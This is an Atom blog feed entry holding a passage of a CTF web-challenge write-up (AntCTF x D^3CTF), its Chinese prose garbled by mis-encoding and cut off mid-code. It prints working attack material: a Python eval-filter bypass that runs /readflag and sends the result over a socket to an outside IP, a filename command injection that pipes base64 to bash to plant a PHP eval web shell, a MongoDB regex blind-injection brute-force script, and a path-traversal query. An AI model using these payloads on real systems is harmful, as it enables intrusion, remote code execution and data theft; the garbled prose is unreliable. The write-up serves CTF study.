<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-05-07T09:40:34.530Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AntCTF x DÂ³CTF web å¤ç°</title>
    <link href="https://ke1nys.github.io/posts/d27bfad9.html"/>
    <id>https://ke1nys.github.io/posts/d27bfad9.html</id>
    <published>2023-05-02T07:30:06.000Z</published>
    <updated>2023-05-07T09:40:34.530Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œçš„å¤ç°éƒ½æ˜¯å»ç½‘ä¸Šæœç´¢å‰å‡ åå‘çš„wpæ¥å¤ç°çš„</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">äºšå†›wp</a></p><p>è¿˜æœ‰å‚è€ƒ <a href="https://boogipop.com/">boogipopçš„wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> é¢˜ç›®è¿˜ç»™äº†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å°±æ˜¯è‡ªå·±æƒ³æ–¹æ³•è¿›è¡Œç»•è¿‡äº†</p><p>æœ€åæ˜¯åœ¨evalè¿™é‡Œè¿›è¡Œä»£ç çš„æ‰§è¡Œ</p><p>å› ä¸ºå…³é”®å‡½æ•°è¢«ç¦äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨å…¨è§’ç¬¦å·è¿›è¡Œç»•è¿‡</p><p>è¿·ä½ ä¸Šæ ‡å’Œä¸‹æ ‡ï¼ˆ0~9ã€å­—æ¯ã€ç‰¹æ®Šå­—ç¬¦ï¼‰</p><p>ç”¨ä¸Šé¢çš„è¿·ä½ ä¸Šæ ‡æˆ–å…¨è§’ç¬¦å·èƒ½èƒ½ç»•è¿‡ï¼Œæœ¬åœ°æµ‹è¯•è¿‡äº†</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">å‚è€ƒæ–‡ç« </a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>ç»™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;ğŸ¢ğŸ£ğŸ¤ğŸ¥ğŸ¦ğŸ§ğŸ¨ğŸ©ğŸªğŸ«&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;áµ‰val(vars(áµ‰val(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šé¢æ‰§è¡Œçš„æ˜¯pythonçš„shellåå¼¹</p><p>ç„¶åå°±å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ¥æ”¶åˆ°äº†</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>é¢˜ç›®</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>è¿™é‡Œ<code>url/admin</code>è®¿é—®åå°ï¼Œç„¶åå¼±å¯†ç  admin/admin è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>å‘ç°è¿™æ–‡ä»¶åï¼Œç„¶åè¿›è¡Œè¯»å–   è¿›è¡Œé¢˜ç›®çš„æç¤ºå’Œå®˜æ–¹æ–‡ä»¶çš„å¯¹æ¯”ä¹‹åå‘ç°å¤šäº†ä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å¤šäº†è¿™æ®µä»£ç ï¼Œå’Œé¢˜ç›®è¯´çš„å¢åŠ äº†æœ‰ä¸ªæ–°åŠŸèƒ½ç›¸å¯¹åº”</p><p><strong>è¿™é‡Œçš„è¯æ˜¯æœ‰æœ‰ä¸ªè‡ªåŠ¨è§£å‹çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨è¿™é‡Œçš„æŠŠè‡ªå·±æƒ³è¦çš„å‘½ä»¤æ”¾è¿›å‹ç¼©åŒ…é‡Œï¼Œç„¶åè§£å‹åˆ°è‡ªå·±è®¾ç½®çš„ç›®å½•ä¸‹</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>é¢˜ç›®è¿™é‡Œä¹Ÿç»™æç¤ºäº†ï¼Œå°±æ˜¯å»æ‰¾è§£å‹çš„å‡½æ•°æ–¹æ³•é‚£è¾¹</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>é‡Œé¢çš„è¿™æ®µä»£ç æ˜¯è·å–æ–‡ä»¶åç¼€çš„</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç›®çš„æ˜¯æŠŠä¸€å¥è¯æœ¨é©¬å†™è¿›æ¥</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>èƒ½è¿›è¡Œåˆ¤æ–­é€šè¿‡</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>è¿™é‡Œçš„è¯å°±å¾—åœ¨æ–‡ä»¶åå‡ºå†™ç äº†</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶å¹¶æŠ“åŒ…</p><p>å†…å®¹éšä¾¿</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>è¿™ä¸ªä»£ç çš„æ„æ€æ˜¯å°†base64è§£ç åï¼Œç„¶åç”¨bashå‘½ä»¤è¿›è¡Œæ‰§è¡Œ</p><p><code>echo &#39;&lt;?php eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>è¿™å°±æ˜¯ç­‰ä¼šæ‰§è¡Œçš„å‘½ä»¤</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>æˆåŠŸè¿›è¡Œæ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯æŠŠä¸Šä¼ æ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶çš„åœ°å€ç»™è§£å‹åˆ°å½“å‰åœ°å€</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>è¿™ä¸ª1.zipå¤„å°±æ˜¯æˆ‘ä»¬å¯æ§çš„æ–‡ä»¶åï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨åˆ†å·éš”å¼€ï¼Œç„¶åè¿›è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å…¶ä»–å‘½ä»¤äº†</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>æŸ¥çœ‹ç¬¬ä¸€ä¸ªhintåï¼Œå‘ç°æ˜¯nosqlæ³¨å…¥é‡Œçš„<strong>MongoDB</strong>æ³¨å…¥</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p><p>å¯ä»¥ä»è¿™ç¯‡æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ </p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>è¾“å…¥è¿‡æ»¤çš„è¯ä¼šè¾“å‡ºHacker</p><p>è¾“å…¥é”™è¯¯çš„å¯†ç æ˜¯ä¼šè¾“å‡ºä¸‹é¢çš„ä¸œè¥¿</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>ä½¿ç”¨<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•ç™»å½•çš„ä¸æ˜¯adminç”¨æˆ·</strong></p><p><strong>è¿™ä¸ªå°±æ˜¯å¯¹å¯†ç çš„æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„è¯æ˜¯ä½¿ç”¨é€šé…ç¬¦æ¥åŒ¹é…</strong>(ä¸Šé¢ç»™çš„nosqlçš„æ–‡ç« é‡Œè®²çš„å¾ˆæ¸…æ¥šè¿™ä¸ªæ­£åˆ™åŒ¹é…)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>è¿™ä¸ªä¹Ÿè¡Œï¼Œå°±æ˜¯</p><p>ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±è·Ÿæ®invalidçš„å‡ºç°çš„æ ‡å¿—æ¥åˆ¤æ–­å¯†ç </p><p>æœ€å¥½çˆ†å‡ºå¯†ç ä¸º  <code>dob2xdriaqpytdyh6jo3</code></p><p>ç„¶åè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>æŸ¥çœ‹æºç åå‘ç°ç¬¬äºŒä¸ªhint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>ç„¶åæµ‹è¯•äº†ä¸€ä¸‹æ˜¯åœ¨è¿™ä¸ªç›®å½•ä¸‹å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„è¯»å– (<strong>è¿™é‡Œä¼šæµ‹è¯•æ—¶å› ä¸ºæç¤ºç»™çš„ä»£ç ä¸­æœ‰filenameè¿™ä¸ªå‚æ•°</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>ä¸ç»™è¯»å–ï¼Œç„¶åå°±å°è¯•ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªJavaScriptå¯¹è±¡æ¥è¡¨ç¤ºæ–‡ä»¶è·¯å¾„ã€‚å…¶ä¸­ï¼Œâ€filenameâ€æ˜¯è¯¥å¯¹è±¡çš„å±æ€§åï¼Œâ€ [href]â€ã€â€[origin]â€ã€â€[protocol]â€ã€â€[hostname]â€å’Œâ€[pathname]â€åˆ™æ˜¯è¯¥å±æ€§ä¸‹çš„å­å±æ€§ã€‚å…·ä½“ æ¥è¯´ï¼Œå®ƒä»¬åˆ†åˆ«è¡¨ç¤ºæ–‡ä»¶çš„é“¾æ¥åœ°å€ã€æ¥æºã€åè®®ã€ä¸»æœºåå’Œæ–‡ä»¶è·¯å¾„ã€‚ è¿™é‡Œçš„%2561å…¶å®å°±æ˜¯ã€‚å¦‚æœæœ‰éasciiè¿›è¡ŒurlåŠ å¯†ï¼Œåˆ™å°±ä¼šå˜æˆ16è¿›åˆ¶ç„¶åå†è¿›è¡Œurlç¼–ç ï¼Œaçš„16è¿› åˆ¶æ˜¯61</p><p><strong>å…¶å®å°±æ˜¯å¯¹aè¿›è¡Œä¸¤æ¬¡urlç¼–ç </strong></p><p>ç„¶åå°±å¯ä»¥æˆåŠŸçš„æŸ¥çœ‹åˆ°app.jsäº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span 